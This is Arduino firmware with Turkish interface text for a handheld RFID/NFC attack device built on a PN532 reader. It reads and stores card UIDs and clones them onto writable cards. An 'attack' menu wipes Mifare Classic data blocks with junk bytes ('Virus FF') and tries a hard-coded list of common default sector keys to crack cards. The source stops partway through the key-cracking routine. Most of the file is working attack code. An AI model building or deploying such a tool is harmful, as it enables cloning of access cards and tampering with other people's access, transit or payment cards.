#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Adafruit_PN532.h>
#include <SD.h>
#include <FS.h>

#define SD_SCK       4
#define SD_MISO      5
#define SD_MOSI      6
#define SD_CS_PIN    10  

#define PN_SCK   0
#define PN_MISO  1  
#define PN_MOSI  2
#define PN_CS    7

#define OLED_SDA  8
#define OLED_SCL  9

#define PIN_BTN_UP     20   
#define PIN_BTN_SELECT 3  
#define PIN_BTN_DOWN   21  

Adafruit_SSD1306 display(128, 64, &Wire, -1);
Adafruit_PN532 nfc(PN_SCK, PN_MISO, PN_MOSI, PN_CS);

uint8_t currentUID[7];
uint8_t currentUIDLen = 0;
String currentCardType = "Bilinmiyor";

bool needsRedraw = true;

enum AppState { 
  MENU, 
  READ_CARD, 
  SUBMENU_SAVED,  
  LOAD_SD,        
  SELECT_EDIT,    
  EDIT_NAME,      
  DELETE_SD,      
  WRITE_CARD,
  SUBMENU_ATTACK, 
  DISRUPT_TAG,    
  FORMAT_CARD,    
  BRUTE_FORCE     
};
AppState currentState = MENU;

const char* menuItems[] = {
  "1. Kart Okuma",
  "2. Kayitli Kartlar",
  "3. MC Kopyalama",
  "4. Saldiri",       
  "5. Kart Formatla"
};
int menuIndex = 0;
int menuLength = 5; 

const char* attackMenuItems[] = {
  "1. Virus FF",
  "2. Sifre Kirici"
};
int attackMenuIndex = 0;
int attackMenuLength = 2;

const char* subMenuItems[] = {
  "1. Kart Sec",
  "2. Kart Duzenle",
  "3. Kart Sil"
};
int subMenuIndex = 0;
int subMenuLength = 3;

String sdCardList[21];      
String sdCardUIDs[21];      
int sdListCount = 0;
int sdSelectIndex = 0;

String editingUID = "";     
char newNameBuffer[16]; 
int nameCharIndex = 0;      
int charSelectorIndex = 0;  

const char charset[] = "*<ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 "; 
const int charsetLen = 39; 

const uint8_t commonKeys[][6] = {
  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 
  {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5}, 
  {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7}, 
  {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 
  {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5}, 
  {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD}, 
  {0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A}, 
  {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF}, 
  {0x71, 0x4C, 0x5C, 0x88, 0x6E, 0x97}, 
  {0x58, 0x7E, 0xE5, 0xF9, 0x35, 0x0F}, 
  {0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6}, 
  {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00}, 
  {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC}, 
  {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 
  {0x60, 0x3D, 0xEB, 0x10, 0x13, 0x05}, 
  {0x11, 0x22, 0x33, 0x44, 0x55, 0x66}, 
  {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC}, 
  {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD}, 
  {0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A}, 
  {0x71, 0x4C, 0x5C, 0x88, 0x6E, 0x97}, 
  {0x58, 0x7E, 0xE5, 0xF9, 0x35, 0x0F}, 
  {0x60, 0x3D, 0xEB, 0x10, 0x13, 0x05}, 
  {0xAB, 0x76, 0xCD, 0x98, 0xEF, 0x54}, 
  {0xAF, 0xF4, 0xE3, 0x5D, 0x22, 0x76}, 
  {0xB5, 0xA4, 0xB3, 0xB2, 0xB1, 0xB0}, 
  {0x0F, 0x35, 0xF9, 0xE5, 0x7E, 0x58}, 
  {0x97, 0x6E, 0x88, 0x5C, 0x4C, 0x71}, 
  {0x9A, 0x45, 0x7E, 0x2C, 0x98, 0x1A}, 
  {0xDD, 0x51, 0xC3, 0x99, 0x3A, 0x4D}, 
  {0x66, 0x55, 0x44, 0x33, 0x22, 0x11}, 
  {0x24, 0x02, 0x00, 0x00, 0x00, 0x00}, 
  {0x91, 0x12, 0x54, 0x26, 0x00, 0x00}, 
  {0x48, 0x45, 0x58, 0x41, 0x43, 0x54}, 
  {0x53, 0x57, 0x49, 0x50, 0x45, 0x52}, 
  {0x50, 0x82, 0x16, 0x12, 0x19, 0x83}, 
  {0x01, 0x02, 0x03, 0x04, 0x05, 0x06}, 
  {0x69, 0x69, 0x69, 0x69, 0x69, 0x69}, 
  {0x00, 0x01, 0x02, 0x03, 0x04, 0x05}, 
  {0xA0, 0x47, 0x8C, 0xC3, 0x90, 0x91}, 
  {0x53, 0x3B, 0xCC, 0x7A, 0x8C, 0x2A}, 
  {0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA}  
};

const int keyListLen = sizeof(commonKeys) / sizeof(commonKeys[0]); 

void handleMenu(int btn);
void handleReadCard(int btn);
void handleSubMenuSaved(int btn);
void handleSubMenuAttack(int btn); 
void handleLoadSD(int btn);
void handleSelectEdit(int btn);
void handleEditName(int btn);
void handleWriteCard(int btn);
void handleDeleteSD(int btn);
void handleDisruptTag(int btn);
void handleFormatCard(int btn);
void handleBruteForce(int btn);
void performSaveSD(bool autoName);
void loadCardsFromSD();
void drawListMenu(String title, int selIndex);
void showInfo(String title, String msg);
String uidToString(uint8_t *uid, uint8_t len);
void parseHexString(String hexString, uint8_t* uid, uint8_t* len);
uint8_t hexCharToInt(char c);
bool checkIfUidExists(String targetUID);
bool checkIfNameExists(String targetName);
void updateCardNameOnSD(String targetUID, String newName);
void deleteLineFromSD(String uidToDelete);
bool tryWriteUniversal(uint8_t *newUID);
int checkButton();

void setup() {
  pinMode(PIN_BTN_UP, INPUT_PULLUP);     
  pinMode(PIN_BTN_SELECT, INPUT_PULLUP); 
  pinMode(PIN_BTN_DOWN, INPUT_PULLUP);   

  Wire.begin(OLED_SDA, OLED_SCL);
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    for(;;); 
  }

  SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS_PIN);
  bool sdStatus = SD.begin(SD_CS_PIN);

  nfc.begin();
  uint32_t versiondata = nfc.getFirmwareVersion();

  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.setCursor(0,0); display.println("RFID_BOX by Gravey4rd");
  display.drawLine(0,10,128,10,WHITE);
  
  display.setCursor(0,20); 
  if(versiondata) display.println("NFC: TAMAM"); else display.println("NFC: HATA!");
  
  display.setCursor(0,30);
  if(sdStatus) display.println("SD: TAMAM"); else display.println("SD: YOK!");
  
  display.display();
  delay(1500);

  if(versiondata) {
    nfc.SAMConfig();
    nfc.setPassiveActivationRetries(0x10); 
  }
  
  needsRedraw = true; 
}

void loop() {
  int btnAction = checkButton(); 
  
  if(btnAction != 0) needsRedraw = true;

  switch (currentState) {
    case MENU:           handleMenu(btnAction); break;
    case READ_CARD:      handleReadCard(btnAction); break;
    case SUBMENU_SAVED:  handleSubMenuSaved(btnAction); break; 
    case SUBMENU_ATTACK: handleSubMenuAttack(btnAction); break; 
    case LOAD_SD:        handleLoadSD(btnAction); break;
    case SELECT_EDIT:    handleSelectEdit(btnAction); break;   
    case EDIT_NAME:      handleEditName(btnAction); break;     
    case WRITE_CARD:     handleWriteCard(btnAction); break;
    case DELETE_SD:      handleDeleteSD(btnAction); break;
    case DISRUPT_TAG:    handleDisruptTag(btnAction); break;
    case FORMAT_CARD:    handleFormatCard(btnAction); break;
    case BRUTE_FORCE:    handleBruteForce(btnAction); break;
  }
}

int checkButton() {
  static unsigned long lastPressTime = 0;
  if (millis() - lastPressTime < 150) return 0;

  if (digitalRead(PIN_BTN_UP) == LOW) { 
    delay(50);
    lastPressTime = millis();
    return 1; 
  }
  if (digitalRead(PIN_BTN_SELECT) == LOW) { 
    delay(50);
    lastPressTime = millis();
    return 2; 
  }
  if (digitalRead(PIN_BTN_DOWN) == LOW) { 
    delay(50);
    lastPressTime = millis();
    return 3; 
  }
  return 0;
}

void handleMenu(int btn) {
  if (btn == 1) { 
    menuIndex--;
    if (menuIndex < 0) menuIndex = menuLength - 1;
  } 
  else if (btn == 3) { 
    menuIndex++;
    if (menuIndex >= menuLength) menuIndex = 0; 
  }
  else if (btn == 2) { 
    switch(menuIndex) {
      case 0: currentState = READ_CARD; break;
      case 1: currentState = SUBMENU_SAVED; subMenuIndex = 0; break; 
      case 2: currentState = WRITE_CARD; break;
      case 3: currentState = SUBMENU_ATTACK; attackMenuIndex = 0; break; 
      case 4: currentState = FORMAT_CARD; break;
    }
    needsRedraw = true;
    return;
  }

  if (!needsRedraw) return;

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE); 
  
  display.setCursor(0,0); display.println("ANA MENU");
  display.drawLine(0,9,128,9,WHITE);
  
  for(int i=0; i<menuLength; i++) {
    if(i == menuIndex) display.setTextColor(BLACK, WHITE);
    else display.setTextColor(WHITE);
    display.setCursor(0, 12 + (i*10));
    display.println(menuItems[i]);
  }
  display.display();
  needsRedraw = false;
}

void handleSubMenuAttack(int btn) {
  if (btn == 1) { 
    currentState = MENU;
    needsRedraw = true;
    return;
  } 
  else if (btn == 3) { 
    attackMenuIndex++;
    if (attackMenuIndex >= attackMenuLength) attackMenuIndex = 0; 
  }
  else if (btn == 2) { 
    switch(attackMenuIndex) {
      case 0: currentState = DISRUPT_TAG; break; 
      case 1: currentState = BRUTE_FORCE; break; 
    }
    needsRedraw = true;
    return;
  }

  if (!needsRedraw) return;

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  
  display.setCursor(0,0); display.println("Saldiri Araclari");
  display.drawLine(0,9,128,9,WHITE);

  for(int i=0; i<attackMenuLength; i++) {
    if(i == attackMenuIndex) display.setTextColor(BLACK, WHITE);
    else display.setTextColor(WHITE);
    display.setCursor(0, 12 + (i*10));
    display.println(attackMenuItems[i]);
  }
  
  display.setCursor(0, 55); display.setTextSize(1); 
  display.setTextColor(WHITE); 
  display.print("Geri <");
  
  display.display();
  needsRedraw = false;
}

void handleSubMenuSaved(int btn) {
  if (btn == 1) { 
    currentState = MENU;
    needsRedraw = true;
    return;
  } 
  else if (btn == 3) { 
    subMenuIndex++;
    if (subMenuIndex >= subMenuLength) subMenuIndex = 0; 
  }
  else if (btn == 2) { 
    loadCardsFromSD(); 
    switch(subMenuIndex) {
      case 0: currentState = LOAD_SD; break; 
      case 1: currentState = SELECT_EDIT; break; 
      case 2: currentState = DELETE_SD; break; 
    }
    needsRedraw = true;
    return;
  }

  if (!needsRedraw) return;

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  
  display.setCursor(0,0); display.println("Kayitli Kartlar");
  display.drawLine(0,9,128,9,WHITE);

  for(int i=0; i<subMenuLength; i++) {
    if(i == subMenuIndex) display.setTextColor(BLACK, WHITE);
    else display.setTextColor(WHITE);
    display.setCursor(0, 12 + (i*10));
    display.println(subMenuItems[i]);
  }
  
  display.setCursor(0, 55); display.setTextSize(1); 
  display.setTextColor(WHITE); 
  display.print("Geri <");
  
  display.display();
  needsRedraw = false;
}

void handleReadCard(int btn) {
  if (needsRedraw) {
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setCursor(0,0); display.println("Kart Okunuyor...");
    display.setCursor(0,45); display.println("Geri <");
    display.display();
    needsRedraw = false;
  }
  
  if (btn == 1) { currentState = MENU; needsRedraw = true; return; }

  uint8_t uid[7];
  uint8_t uidLen;
  
  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 50)) {
    memcpy(currentUID, uid, uidLen);
    currentUIDLen = uidLen;
    
    if(uidLen == 4) currentCardType = "Mifare Classic";
    else if(uidLen == 7) currentCardType = "Ultralight";
    else currentCardType = "Generic";

    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setCursor(0,0); display.println("Kart Bulundu!");
    display.drawLine(0,9,128,9,WHITE);
    
    display.setCursor(0,12); display.print("UID: "); 
    display.println(uidToString(currentUID, currentUIDLen));
    
    display.setCursor(0,30); display.print("Tip: "); display.println(currentCardType);
    
    display.drawLine(0,42,128,42,WHITE);
    display.setCursor(0,45); display.println("Geri <");
    display.setCursor(0,54); display.println("Sec: Kaydet"); 

    display.display();
    
    while(true) {
      int action = checkButton();
      if(action == 1) { 
        currentState = MENU; 
        needsRedraw = true;
        return; 
      }
      if(action == 2) { 
        performSaveSD(true); 
        currentState = MENU; 
        needsRedraw = true;
        return; 
      }
      delay(10);
    }
  }
}

void performSaveSD(bool autoName) {
  if(currentUIDLen == 0) { showInfo("HATA", "UID Yok!"); return; }
  if(!SD.begin(SD_CS_PIN)) { showInfo("SD HATA", "Kart Takili mi?"); return; }

  String uidStr = uidToString(currentUID, currentUIDLen);
  if(checkIfUidExists(uidStr)) { showInfo("UYARI", "Kart Zaten Kayitli!"); return; }

  File dataFile = SD.open("/database.txt", FILE_APPEND);
  if (dataFile) {
    String nameToSave = "Isimsiz Kart";
    if(autoName) nameToSave = "Kart " + uidStr.substring(0,2) + uidStr.substring(uidStr.length()-2);
    
    String line = uidStr + "," + currentCardType + "," + nameToSave;
    dataFile.println(line);
    dataFile.close();
    showInfo("Kayit Basarili", nameToSave);
  } else {
    showInfo("Yazma Hatasi", "Dosya acilamadi");
  }
}

void loadCardsFromSD() {
  sdListCount = 0; 
  sdSelectIndex = 0;
  if(!SD.begin(SD_CS_PIN)) return;
  
  File dataFile = SD.open("/database.txt", FILE_READ);
  if (dataFile) {
    while (dataFile.available() && sdListCount < 21) {
      String line = dataFile.readStringUntil('\n');
      line.trim();
      if(line.length() > 0) {
        int firstComma = line.indexOf(',');
        int secondComma = line.indexOf(',', firstComma + 1);
        
        if (firstComma > 0) { 
            String uid = line.substring(0, firstComma);
            String name = "";
            if(secondComma != -1) name = line.substring(secondComma + 1); 
            else name = uid; 
            sdCardUIDs[sdListCount] = uid;
            sdCardList[sdListCount] = name;
            sdListCount++;
        }
      }
    }
    dataFile.close();
  }
}

void handleLoadSD(int btn) {
  if(sdListCount == 0) {
    showInfo("Liste Bos", ""); 
    if(btn == 1) { currentState = SUBMENU_SAVED; needsRedraw = true; }
    return;
  }

  if (btn == 1) { 
    currentState = SUBMENU_SAVED;
    needsRedraw = true;
    return;
  } 
  else if (btn == 3) { 
    sdSelectIndex++;
    if (sdSelectIndex >= sdListCount) sdSelectIndex = 0;
  }
  else if (btn == 2) { 
    parseHexString(sdCardUIDs[sdSelectIndex], currentUID, &currentUIDLen);
    currentCardType = "SD Kayit";
    showInfo("Secildi: " + sdCardList[sdSelectIndex], "Kopyalama Modu...");
    currentState = WRITE_CARD; 
    needsRedraw = true;
    return;
  }
  
  if(needsRedraw || btn != 0) {
    drawListMenu("Kart Sec", sdSelectIndex);
    needsRedraw = false;
  }
}

void handleSelectEdit(int btn) {
  if(sdListCount == 0) {
    showInfo("Liste Bos", "");
    if(btn == 1) { currentState = SUBMENU_SAVED; needsRedraw = true; }
    return;
  }

  if (btn == 1) { 
    currentState = SUBMENU_SAVED;
    needsRedraw = true;
    return;
  } 
  else if (btn == 3) { 
    sdSelectIndex++;
    if (sdSelectIndex >= sdListCount) sdSelectIndex = 0;
  }
  else if (btn == 2) { 
    editingUID = sdCardUIDs[sdSelectIndex];
    memset(newNameBuffer, 0, sizeof(newNameBuffer)); 
    nameCharIndex = 0; 
    charSelectorIndex = 0; 
    currentState = EDIT_NAME;
    needsRedraw = true;
    return;
  }
  
  if(needsRedraw || btn != 0) {
    drawListMenu("Kart Duzenleme", sdSelectIndex);
    needsRedraw = false;
  }
}

void handleEditName(int btn) {
  if (btn == 3) { 
    charSelectorIndex++;
    if (charSelectorIndex >= charsetLen) charSelectorIndex = 0;
  } 
  else if (btn == 1) { 
    charSelectorIndex--;
    if (charSelectorIndex < 0) charSelectorIndex = charsetLen - 1;
  }
  else if (btn == 2) { 
    if (charSelectorIndex == 0) {
      String nameToSave = String(newNameBuffer);
      nameToSave.trim(); 

      if (nameToSave.length() == 0) {
        nameToSave = sdCardList[sdSelectIndex]; 
        showInfo("UYARI", "Eski Isim Korundu");
      } 
      else {
        String currentOldName = sdCardList[sdSelectIndex];
        currentOldName.trim();
        
        if (!nameToSave.equals(currentOldName)) {
           if (checkIfNameExists(nameToSave)) {
             showInfo("HATA", "Isim Kullanimda!");
             delay(1000);
             showInfo("UYARI", "Baska Isim Secin");
             needsRedraw = true;
             return; 
           }
        }
        showInfo("KAYDEDILDI", nameToSave);
      }

      updateCardNameOnSD(editingUID, nameToSave);
      loadCardsFromSD(); 
      currentState = SELECT_EDIT; 
      needsRedraw = true;
      return;
    } 
    else if (charSelectorIndex == 1) {
      if (nameCharIndex > 0) {
        nameCharIndex--;
        newNameBuffer[nameCharIndex] = '\0'; 
      }
    }
    else {
      if (nameCharIndex < 14) {
        newNameBuffer[nameCharIndex] = charset[charSelectorIndex];
        nameCharIndex++;
        newNameBuffer[nameCharIndex] = '\0'; 
        charSelectorIndex = 0; 
      }
    }
  }
  
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE); 
  display.setCursor(0,0); display.println("Isim Duzenleme");
  display.drawLine(0,9,128,9,WHITE);
  
  display.setTextSize(2);
  display.setCursor(0, 20);
  display.print(newNameBuffer);
  display.print("_"); 

  display.setTextSize(1);
  display.fillRect(0, 50, 128, 14, WHITE);
  display.setTextColor(BLACK, WHITE);
  display.setCursor(2, 53);
  
  if (charSelectorIndex == 0) {
    display.print("<< KAYDET >>");
  } 
  else if (charSelectorIndex == 1) {
    display.print("<< SIL >>"); 
  }
  else {
    display.print("SECILEN: [ ");
    display.print(charset[charSelectorIndex]);
    display.print(" ]");
  }
  
  display.setTextColor(WHITE); 
  display.display();
}

void updateCardNameOnSD(String targetUID, String newName) {
  File original = SD.open("/database.txt", FILE_READ);
  if (!original) return;

  if (SD.exists("/temp.txt")) SD.remove("/temp.txt");
  
  File temp = SD.open("/temp.txt", FILE_WRITE);
  if(!temp) { original.close(); return; }

  while(original.available()) {
    String line = original.readStringUntil('\n');
    line.trim();
    if(line.length() > 0) {
      if(line.startsWith(targetUID)) {
        int firstComma = line.indexOf(',');
        int secondComma = line.indexOf(',', firstComma + 1);
        String type = "";
        if(secondComma != -1) type = line.substring(firstComma+1, secondComma);
        else type = line.substring(firstComma+1);
        
        String newLine = targetUID + "," + type + "," + newName;
        temp.println(newLine);
      } else {
        temp.println(line);
      }
    }
  }
  original.close();
  temp.close();

  SD.remove("/database.txt");
  SD.rename("/temp.txt", "/database.txt");
}

void handleDeleteSD(int btn) {
  if(sdListCount == 0) {
    showInfo("Liste Bos", "");
    if(btn == 1) { currentState = SUBMENU_SAVED; needsRedraw = true; }
    return;
  }

  if (btn == 1) { 
    currentState = SUBMENU_SAVED;
    needsRedraw = true;
    return;
  } 
  else if (btn == 3) { 
    sdSelectIndex++;
    if (sdSelectIndex >= sdListCount) sdSelectIndex = 0;
  }
  else if (btn == 2) { 
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setCursor(0,0); display.println("Siliniyor...");
    display.display();
    
    deleteLineFromSD(sdCardUIDs[sdSelectIndex]);
    showInfo("Silindi", sdCardList[sdSelectIndex]);
    loadCardsFromSD(); 
    if(sdSelectIndex >= sdListCount) sdSelectIndex = (sdListCount > 0) ? sdListCount - 1 : 0;
    needsRedraw = true;
    return;
  }

  if(needsRedraw || btn != 0) {
    drawListMenu("Karti Sil", sdSelectIndex);
    needsRedraw = false;
  }
}

void drawListMenu(String title, int selIndex) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  
  display.setCursor(0,0); display.println(title);
  display.drawLine(0,9,128,9,WHITE);
  
  int startIdx = (selIndex > 3) ? selIndex - 3 : 0;
  
  int scrollBarX = 124; 
  int scrollBarY = 12;  
  int scrollBarH = 52;  
  int scrollBarW = 3;   
  
  if(sdListCount > 0) { 
    display.drawFastVLine(scrollBarX - 2, scrollBarY, scrollBarH, WHITE);
    int thumbHeight = max(3, scrollBarH / sdListCount); 
    int thumbY = scrollBarY;
    if(sdListCount > 1) {
       thumbY = map(selIndex, 0, sdListCount - 1, scrollBarY, scrollBarY + scrollBarH - thumbHeight);
    }
    display.fillRect(scrollBarX, thumbY, scrollBarW, thumbHeight, WHITE);
  }

  for(int i=0; i<4; i++) {
    int actualIdx = startIdx + i;
    if(actualIdx >= sdListCount) break;
    
    if(actualIdx == selIndex) display.setTextColor(BLACK, WHITE);
    else display.setTextColor(WHITE);
    
    display.setCursor(0, 12 + (i*10));
    display.println(sdCardList[actualIdx]);
  }
  
  display.setCursor(110, 0); display.setTextSize(1); 
  display.setTextColor(WHITE); 
  display.print("^");
  
  display.display();
}

bool checkIfUidExists(String targetUID) {
  File f = SD.open("/database.txt", FILE_READ);
  if(!f) return false;

  bool found = false;
  while(f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();
    if(line.startsWith(targetUID)) {
      found = true;
      break;
    }
  }
  f.close();
  return found;
}

bool checkIfNameExists(String targetName) {
  File f = SD.open("/database.txt", FILE_READ);
  if(!f) return false;

  bool found = false;
  targetName.trim(); 

  while(f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();
    if(line.length() > 0) {
      int firstComma = line.indexOf(',');
      int secondComma = line.indexOf(',', firstComma + 1);
      
      String currentName = "";
      if(secondComma != -1) {
        currentName = line.substring(secondComma + 1);
      } else {
        currentName = line.substring(0, firstComma); 
      }
      currentName.trim();
      
      if(currentName.equals(targetName)) {
        found = true;
        break;
      }
    }
  }
  f.close();
  return found;
}

void deleteLineFromSD(String uidToDelete) {
  File original = SD.open("/database.txt", FILE_READ);
  if (!original) return;

  if (SD.exists("/temp.txt")) SD.remove("/temp.txt");
  File temp = SD.open("/temp.txt", FILE_WRITE);
  
  if(!temp) { original.close(); return; }

  while(original.available()) {
    String line = original.readStringUntil('\n');
    line.trim();
    if(line.length() > 0) {
      if(!line.startsWith(uidToDelete)) {
        temp.println(line);
      }
    }
  }
  original.close();
  temp.close();

  SD.remove("/database.txt");
  SD.rename("/temp.txt", "/database.txt");
}

void handleWriteCard(int btn) {
  if(needsRedraw) {
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setCursor(0,0); display.println("Karti Yaklastirin");
    display.setCursor(0,20); display.println("Yazilacak UID:");
    display.setCursor(0,30); display.println(uidToString(currentUID, currentUIDLen));
    display.setCursor(0,55); display.println("Geri <");
    display.display();
    needsRedraw = false;
  }

  if(btn == 2) { currentState = MENU; needsRedraw = true; return; }
  
  if(currentUIDLen != 4) {
    showInfo("UYARI", "Sadece 4-Byte UID!");
    currentState = MENU;
    needsRedraw = true;
    return;
  }

  uint8_t uid[7]; uint8_t len;
  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 50)) {
    if(tryWriteUniversal(currentUID)) {
      showInfo("Kopyalama BASARILI!", "Menuye donuluyor");
      currentState = MENU;
      needsRedraw = true;
    } else {
      showInfo("Hata!", "Kopyalama BASARISIZ!");
      delay(1000);
      needsRedraw = true; 
    }
  }
  
  if(btn == 1) { currentState = MENU; needsRedraw = true; }
}

void handleDisruptTag(int btn) {
  if (needsRedraw) {
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setCursor(0,0); display.println("Virus Modu");
    display.drawLine(0,10,128,10,WHITE);
    display.setCursor(0,20); display.println("Karti Yaklastir...");
    display.setCursor(0,35); display.println("Yaziliyor ve");
    display.setCursor(0,45); display.println("Kontrol ediliyor...");
    display.setCursor(0,55); display.println("Geri <");
    display.display();
    needsRedraw = false;
  }

  if (btn == 1) { 
    currentState = SUBMENU_ATTACK; 
    needsRedraw = true; 
    return; 
  }

  uint8_t uid[7];
  uint8_t uidLen;
  
  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 50)) {
    if (uidLen != 4) {
      showInfo("HATA", "Sadece Mifare 1K!");
      needsRedraw = true;
      return;
    }

    display.clearDisplay();
    display.setCursor(0,0); display.println("Islem Suruyor...");
    display.display();

    uint8_t keyUniversal[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
    uint8_t junkData[16];
    memset(junkData, 0xFF, 16); 

    int verifiedBlocks = 0; 
    int totalWritableBlocks = 0;

    for (uint8_t sector = 0; sector < 16; sector++) {
      if (nfc.mifareclassic_AuthenticateBlock(uid, uidLen, sector * 4, 0, keyUniversal)) {
        for (uint8_t i = 0; i < 4; i++) {
          uint8_t currentBlock = (sector * 4) + i;
          if (currentBlock == 0) continue;
          if (i == 3) continue;

          totalWritableBlocks++;
          bool writeSuccess = nfc.mifareclassic_WriteDataBlock(currentBlock, junkData);
          
          if (writeSuccess) {
            uint8_t readBuffer[16];
            if (nfc.mifareclassic_ReadDataBlock(currentBlock, readBuffer)) {
              if (readBuffer[0] == 0xFF && readBuffer[15] == 0xFF) {
                verifiedBlocks++;
              }
            }
          }
        }
        display.fillRect(0, 30, map(sector, 0, 15, 0, 128), 10, WHITE);
        display.display();
      }
    }

    display.clearDisplay();
    display.setCursor(0,0); display.println("Sonuc Raporu:");
    display.drawLine(0,10,128,10,WHITE);
    
    display.setCursor(0,20); 
    display.print("Hedef Blok: "); display.println(totalWritableBlocks);
    
    display.setCursor(0,30); 
    display.print("Basarili:   "); display.println(verifiedBlocks);

    if (verifiedBlocks > 40) { 
       display.setCursor(0,50); display.println("Durum: BASARILI!");
    } else {
       display.setCursor(0,50); display.println("Durum: BASARISIZ!");
    }
    
    display.display();
    while(checkButton() == 0) { delay(10); }
    currentState = MENU;
    needsRedraw = true;
  }
}

void handleFormatCard(int btn) {
  if (needsRedraw) {
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setCursor(0,0); display.println("Formatlama");
    display.drawLine(0,10,128,10,WHITE);
    display.setCursor(0,20); display.println("Karti Yaklastir...");
    display.setCursor(0,35); display.println("Dikkat: Sifreler de");
    display.setCursor(0,45); display.println("sifirlanacak!");
    display.setCursor(0,55); display.println("Geri <");
    display.display();
    needsRedraw = false;
  }

  if (btn == 1) { 
    currentState = MENU; 
    needsRedraw = true; 
    return; 
  }

  uint8_t uid[7];
  uint8_t uidLen;
  
  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 50)) {
    if (uidLen != 4) {
      showInfo("HATA", "Sadece Mifare 1K!");
      needsRedraw = true;
      return;
    }

    display.clearDisplay();
    display.setCursor(0,0); display.println("Sifirlaniyor...");
    display.display();

    uint8_t keyUniversal[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
    uint8_t emptyData[16];
    memset(emptyData, 0x00, 16); 

    uint8_t factoryTrailer[16] = {
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
      0xFF, 0x07, 0x80, 0x69,             
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF  
    };

    int verifiedBlocks = 0; 
    int totalWritableBlocks = 0;
    int authFailCount = 0;

    for (uint8_t sector = 0; sector < 16; sector++) {
      if (nfc.mifareclassic_AuthenticateBlock(uid, uidLen, sector * 4, 0, keyUniversal)) {
        for (uint8_t i = 0; i < 4; i++) {
          uint8_t currentBlock = (sector * 4) + i;
          if (currentBlock == 0) continue;

          totalWritableBlocks++;
          bool writeSuccess = false;

          if (i == 3) {
             writeSuccess = nfc.mifareclassic_WriteDataBlock(currentBlock, factoryTrailer);
          } 
          else {
             writeSuccess = nfc.mifareclassic_WriteDataBlock(currentBlock, emptyData);
          }
          
          if (writeSuccess) {
            if (i != 3) {
                uint8_t readBuffer[16];
                if (nfc.mifareclassic_ReadDataBlock(currentBlock, readBuffer)) {
                  if (readBuffer[0] == 0x00) verifiedBlocks++;
                }
            } else {
                verifiedBlocks++;
            }
          }
        }
      } 
      else {
        authFailCount++;
      }
      display.fillRect(0, 30, map(sector, 0, 15, 0, 128), 10, WHITE);
      display.display();
    }

    display.clearDisplay();
    display.setCursor(0,0); display.println("Format Raporu:");
    display.drawLine(0,10,128,10,WHITE);
    
    if (authFailCount > 0) {
        display.setCursor(0,20); display.print("Sifre Hatasi: "); display.println(authFailCount);
        display.setCursor(0,35); display.println("Kart Kilitli!");
        display.setCursor(0,45); display.println("Formatlanamadi.");
    } 
    else {
        display.setCursor(0,20); 
        display.print("Temizlenen: "); display.println(verifiedBlocks);

        if (verifiedBlocks > 40) { 
           display.setCursor(0,45); display.println("Durum: SIFIRLANDI!");
        } else {
           display.setCursor(0,45); display.println("Durum: YAZMA HATASI!");
        }
    }
    
    display.display();
    while(checkButton() == 0) { delay(10); }
    currentState = MENU;
    needsRedraw = true;
  }
}

void handleBruteForce(int btn) {
  if (needsRedraw) {
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setCursor(0,0); display.println("Sifre Kirma");
    display.drawLine(0,10,128,10,WHITE);
    display.setCursor(0,20); display.println("Karti Yaklastir...");
    display.setCursor(0,35); display.println("Yaygin sifreler");
    display.setCursor(0,45); display.println("denenecek...");
    display.setCursor(0,55); display.println("Geri <");
    display.display();
    needsRedraw = false;
  }

  if (btn == 1) { 
    currentState = SUBMENU_ATTACK; 
    needsRedraw = true; 
    return; 
  }

  uint8_t uid[7];
  uint8_t uidLen;
  
  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 50)) {
    display.clearDisplay();
    display.setCursor(0,0); display.println("Saldiri Basladi...");
    display.display();

    int foundKeys = 0;
    String foundKeysLog = "";

    for (uint8_t sector = 0; sector < 16; sector++) {
      bool sectorCracked = false;
      
